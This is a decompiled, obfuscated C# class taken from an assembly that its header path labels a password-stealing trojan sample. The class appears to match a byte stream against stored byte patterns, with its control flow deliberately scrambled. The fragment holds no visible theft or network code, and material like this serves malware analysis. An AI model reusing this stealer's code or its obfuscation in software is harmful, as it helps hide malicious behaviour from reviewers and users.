// Decompiled with JetBrains decompiler
// Type: ib.pP
// Assembly: ContingentPropert, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 10450B75-DDB2-42D8-896D-5D92C0FA5DAE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-f9a3872603bab9d16727daf3e24705ff94100d4bf2838679b5e9288aa02bd32a.exe

namespace ib
{
  public class pP
  {
    private d5[] Nk;
    private jn gq;
    private int gy;
    private int Au;
    private bool V6;
    internal static pP hg;

    public pP(jn _param1, bool _param2, d5[] _param3)
    {
      Jnb.vbPcO4();
      this.gy = 0;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.Nk = _param3;
      int num = 0;
      if (false)
        goto label_3;
label_1:
      switch (num)
      {
        default:
          this.gq = _param1;
          this.V6 = _param2;
          this.gy = 0;
          return;
      }
label_3:
      num = 0;
      goto label_1;
    }

    public bool Q0()
    {
      long num1 = this.gq.x1();
      this.Au = this.Nk.Length;
      int num2 = 1;
      if (pP.hA())
        goto label_2;
label_1:
      int num3;
      num2 = num3;
label_2:
      bool flag1;
      int index1;
      while (true)
      {
        bool[] flagArray;
        bool flag2;
        int index2;
        byte num4;
        bool flag3;
        switch (num2)
        {
          case 1:
            flagArray = new bool[this.Nk.Length];
            index2 = 0;
            break;
          case 2:
            goto label_14;
          case 3:
label_4:
            flag2 = !flagArray[index1];
            num2 = 6;
            continue;
          case 4:
            flag1 = false;
            num2 = 2;
            continue;
          case 5:
            if (!flag3)
              goto label_12;
            else
              goto label_22;
          case 6:
            if (flag2)
            {
              if ((int) this.Nk[index1].hB[index2] != (int) num4)
              {
                flagArray[index1] = true;
                --this.Au;
              }
              flag3 = index2 == this.Nk[index1].hB.Length - 1 && !flagArray[index1];
              num2 = 5;
              continue;
            }
            goto label_12;
          case 7:
label_10:
            num4 = this.gq.nx();
            if (pP.hA())
            {
              num2 = 0;
              continue;
            }
            goto label_1;
          default:
            index1 = 0;
            goto label_11;
        }
label_9:
        if (this.Au > 0)
        {
          if (this.V6 && this.gq.NZ().Position == this.gq.NZ().Length)
          {
            if (pP.Oy() == null)
            {
              num2 = 4;
              continue;
            }
            goto label_1;
          }
          else
            goto label_10;
        }
        else
          goto label_18;
label_11:
        if (index1 >= this.Nk.Length)
        {
          ++index2;
          goto label_9;
        }
        else
          goto label_4;
label_12:
        ++index1;
        goto label_11;
      }
label_14:
      return flag1;
label_18:
      this.gq.S7(num1);
      flag1 = true;
      goto label_14;
label_22:
      this.gy = index1;
      this.gq.S7(num1);
      flag1 = false;
      goto label_14;
    }

    public d5 eY() => this.Nk[this.gy];

    internal static bool hA() => pP.hg == null;

    internal static pP Oy() => pP.hg;
  }
}
